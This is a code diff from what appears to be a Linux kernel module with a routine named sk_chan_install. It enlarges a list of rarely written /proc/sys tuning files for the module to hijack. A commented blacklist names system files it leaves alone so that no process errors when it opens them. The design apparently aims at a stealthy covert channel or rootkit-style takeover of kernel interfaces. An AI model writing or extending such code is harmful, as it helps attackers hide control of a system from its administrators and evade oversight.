@@ -1611,16 +1611,32 @@ static void sk_chan_install(void)
 	 *     任何进程因打开它而报错
 	 */
 	static const char *cands[] = {
-		/* 本机实测存在、且属于"有实现但几乎无人写"的调优旋钮 */
+		/* 真机实测存在、且属于"有实现但几乎无人写"的调优旋钮。
+		 * 黑名单（绝不劫持）：stat meminfo cpuinfo vmstat loadavg uptime version
+		 *   modules filesystems ns_last_pid tainted randomize_va_space panic* printk*
+		 *   core_pattern modprobe hostname sched_* watchdog* hung_task* perf_* 
+		 */
 		"/proc/sys/vm/watermark_boost_factor",
 		"/proc/sys/vm/percpu_pagelist_high_fraction",
-		"/proc/sys/kernel/hung_task_check_count",
+		"/proc/sys/vm/admin_reserve_kbytes",
+		"/proc/sys/vm/user_reserve_kbytes",
+		"/proc/sys/vm/watermark_scale_factor",
+		"/proc/sys/vm/extfrag_threshold",
+		"/proc/sys/vm/page_lock_unfairness",
+		"/proc/sys/vm/stat_interval",
+		"/proc/sys/vm/oom_dump_tasks",
+		"/proc/sys/vm/mmap_rnd_bits",
+		"/proc/sys/vm/mmap_rnd_compat_bits",
 		"/proc/sys/kernel/sched_deadline_period_min_us",
+		"/proc/sys/kernel/sched_deadline_period_max_us",
+		"/proc/sys/kernel/sched_rr_timeslice_ms",
 		"/proc/sys/kernel/soft_watchdog",
-		/* SysV IPC 分配器：本机未编入时 filp_open 会失败并被跳过 */
-		"/proc/sys/kernel/msg_next_id",
-		"/proc/sys/kernel/sem_next_id",
-		"/proc/sys/kernel/shm_next_id",
+		"/proc/sys/kernel/nmi_watchdog",
+		"/proc/sys/kernel/warn_limit",
+		"/proc/sys/kernel/overflowuid",
+		"/proc/sys/kernel/overflowgid",
+		"/proc/sys/kernel/ngroups_max",
+		"/proc/sys/kernel/max_lock_depth",
 	};
 	typedef struct file *(*open_t)(const char *, int, umode_t);
 	open_t fo = NULL;
